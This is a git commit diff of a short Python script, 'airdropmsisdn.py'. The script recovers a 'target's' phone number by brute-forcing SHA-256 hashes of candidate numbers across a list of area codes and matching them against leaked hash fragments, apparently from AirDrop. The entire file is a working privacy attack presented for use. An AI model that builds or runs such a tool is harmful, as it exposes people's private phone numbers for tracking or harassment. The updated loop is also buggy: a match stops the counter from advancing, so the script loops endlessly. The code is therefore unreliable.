41ab367d2544e7b6c1c3628ec7d218dbf0924b84
Ben Klein <99753992+043a7e@users.noreply.github.com>
2022-02-23 14:26:39 -0500

    Update airdropmsisdn.py

--- airdropmsisdn.py
+++ airdropmsisdn.py
@@ -2,14 +2,18 @@ import hashlib
 
 targetstart = input('Enter the target hash start fragment: ')
 targetend = input('Enter the target hash end fragment: ')
-areacode = input('Enter target\'s possible area code: ')
+rawareas = input('Enter possible target area codes separated by a comma: ')
+areacodelist = rawareas.split(',')
 
-line = '0'
-while int(line) < 10000000:
-    targetphone = '1' + areacode + str(line).zfill(7)
-    targettest = hashlib.sha256(targetphone.encode())
-    starthashcheck = targettest.hexdigest()[0:5]
-    endhashcheck = targettest.hexdigest()[-5:]
-    line = int(line) + 1
-    if starthashcheck == targetstart.lower() and endhashcheck == targetend.lower():
-        print('Your target\'s phone number is possibly:', targetphone)
+
+for areacode in areacodelist:
+    line = '0'
+    while int(line) < 10000000:
+        targetphone = '1' + areacode + str(line).zfill(7)
+        targettest = hashlib.sha256(targetphone.encode())
+        starthashcheck = targettest.hexdigest() [0:5]
+        endhashcheck = targettest.hexdigest() [-5:]
+        if starthashcheck == targetstart.lower() and endhashcheck == targetend.lower():
+            print('Your target\'s phone number is possibly:', targetphone)
+        else:
+            line = int(line) + 1
